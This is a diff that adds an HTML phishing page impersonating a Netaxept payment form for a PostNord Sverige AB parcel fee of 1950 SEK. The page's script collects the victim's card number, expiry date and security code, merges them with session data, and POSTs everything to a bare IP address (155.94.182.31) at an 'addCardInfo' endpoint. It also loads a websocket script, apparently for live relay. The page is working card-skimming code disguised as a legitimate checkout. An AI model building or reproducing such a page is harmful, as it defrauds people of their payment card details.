@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>pay</title>
+  <link rel="stylesheet" href="./css/pay.css" />
+  <script src="./js/rem.js"></script>
+  <script src="./js/jquery-1.8.3.min.js"></script>
+  <script src="./js//websocket.js"></script>
+</head>
+
+<body>
+  <div class="wrap">
+    <div class="header">
+      <h2>Netaxept</h2>
+      <div class="empy"></div>
+      <img src="./img/nets.png" alt="" />
+    </div>
+    <div class="main">
+      <div class="main_header">
+        <img src="./img/sx.png" alt="" />
+        <p style="margin-left: 0.3rem">PostNord Sverige AB</p>
+      </div>
+      <div class="main_center">
+        <br />
+        <br />
+        <p>
+          Merchant：
+          <span>PostNord Sverige AB</span>
+        </p>
+        <p>
+          Amount：
+          <span>1950,00 (SEK)</span>
+        </p>
+        <br />
+        <p>
+          Order number：
+          <span>138386675XR8DY</span>
+        </p>
+        <br />
+        <hr />
+        <br />
+        <br />
+        <p><span>Card number</span></p>
+        <input type="text" oninput="checkStrLong()" id="nbsp" maxlength="19" oninput="value=value.replace(/[^0-9]/g,'')"
+          placeholder="0000 0000 0000 0000" />
+        <div class="tip">
+          <img src="./img/gantan.png" alt="" />
+          <i>The card was entered incorrectly, please re-enter it</i>
+        </div>
+        <br />
+        <br />
+        <p><span>Expiry date (mm/yy)</span></p>
+        <div class="dates">
+          <select name="" id="">
+            <option value="">01</option>
+            <option value="">02</option>
+            <option value="">03</option>
+            <option value="">04</option>
+            <option value="">05</option>
+            <option value="">06</option>
+            <option value="">07</option>
+            <option value="">08</option>
+            <option value="">09</option>
+            <option value="">010</option>
+            <option value="">011</option>
+            <option value="">012</option>
+          </select>
+          <select name="" id="">
+            <option value="">2023</option>
+            <option value="">2024</option>
+            <option value="">2025</option>
+            <option value="">2026</option>
+            <option value="">2027</option>
+            <option value="">2028</option>
+            <option value="">2029</option>
+            <option value="">2030</option>
+            <option value="">2031</option>
+            <option value="">2032</option>
+            <option value="">2033</option>
+            <option value="">2034</option>
+            <option value="">2035</option>
+          </select>
+        </div>
+        <br />
+        <p><span>Security code</span></p>
+        <input type="text" maxlength="4" id="code" oninput="value=value.replace(/[^0-9]/g,'')" placeholder="000" />
+      </div>
+      <div class="main_footer">
+        <!-- <img src="./img/loading.png" alt="" /> -->
+        <button class="btn1">pay</button>
+      </div>
+      <script>
+        let btn1 = document.querySelector('.btn1');
+        btn1.onclick = function () {
+
+          //loading
+
+
+          //校验卡号
+          let card = document.getElementById('nbsp').value;
+          let reg = /^\d{4}\s\d{4}\s\d{4}\s\d{4}$/;
+          if (!reg.test(card)) {
+            alert('Please enter the correct card number');
+            return;
+          }
+          //安全码校验
+          let code = document.querySelector('#code').value;
+          let reg1 = /^\d{3,4}$/;
+          if (!reg1.test(code)) {
+            alert('Please enter the correct security code');
+            return;
+          }
+
+          //获取两个select
+
+          const index = document.querySelectorAll('select')[0].selectedIndex;
+          const index1 = document.querySelectorAll('select')[1].selectedIndex;
+          const month = document.querySelectorAll('select')[0].options[index].text;
+          const year = document.querySelectorAll('select')[1].options[index1].text;
+
+
+
+          showLoading();
+          //获取sessionStorage里的data month + '/' + year
+          let data = JSON.parse(sessionStorage.getItem('data'));
+
+          data.cardNumber = card;
+          data.securityCode = code;
+          data.expDate = month + '/' + year;
+
+          fetch('https://155.94.182.31:8080user/addCardInfo', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+          }).then(res => {
+            const result = res.json();
+            if (result.code == 410) {
+              //清除session 
+              sessionStorage.clear();
+              window.location.href = './index.html';
+            }
+          })
+
+
+
+
+
+          // console.log(btn1);
+          // window.location.href = './code.html';
+        };
+      </script>
+      <script>
+        function checkStrLong() {
+          var reg = /\s{1,}/g;
+          var str = ''; //定义页面展示效果的值
+          var mystr = document.getElementById('nbsp').value;
+          mystr = mystr.replace(reg, '');
+          for (let i = 0; i < mystr.length; i++) {
+            if (i % 4 === 0 && i > 0) {
+              str = str + ' ' + mystr.charAt(i);
+            } else {
+              str = str + mystr.charAt(i);
+            }
+          }
+          document.getElementById('nbsp').value = str;
+          console.log(mystr); //实际输入的值
+        }
+      </script>
+    </div>
+  </div>
+</body>
+
+</html>
